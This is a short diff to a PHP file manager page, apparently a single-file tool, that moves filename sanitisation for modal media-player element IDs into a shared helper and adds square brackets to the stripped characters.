@@ -668,7 +668,7 @@ class XN {
         }
     }
     public static function replace($filename) {
-        return str_replace(array(' ', '.', ':', '-' , '(', ')'), '', $filename);
+        return str_replace(array(' ', '.', ':', '-' , '(', ')', '[', ']'), '', $filename);
     }
     public static function formatSize( $bytes ){
         $types = array( 'Byte', 'KB', 'MB', 'GB', 'TB' );
@@ -2333,7 +2333,6 @@ function filterTable() {
                         <ul class="dropdown">
                             <form method="post" action="?x=<?= getcwd() ?>">
                                 <?php
-                                $rep = str_replace(array(' ', '.', ':', '-' , '(', ')'), '', $file['names']);
                                 switch (XN::getext($file['name'])) {
                                     case 'mp4':
                                     case 'wav':
@@ -2353,8 +2352,8 @@ function filterTable() {
                                     }
                                         ?>
                                         <li>
-                                            <a href="#ex1<?= $rep ?>" rel="modal:open">Play</a>
-                                            <div id="ex1<?= $rep ?>" class="modal">
+                                            <a href="#ex1<?= XN::replace($file['names']) ?>" rel="modal:open">Play</a>
+                                            <div id="ex1<?= XN::replace($file['names']) ?>" class="modal">
                                                 <?php
                                                 switch (XN::getext($file['name'])) {
                                                     case 'm4a':
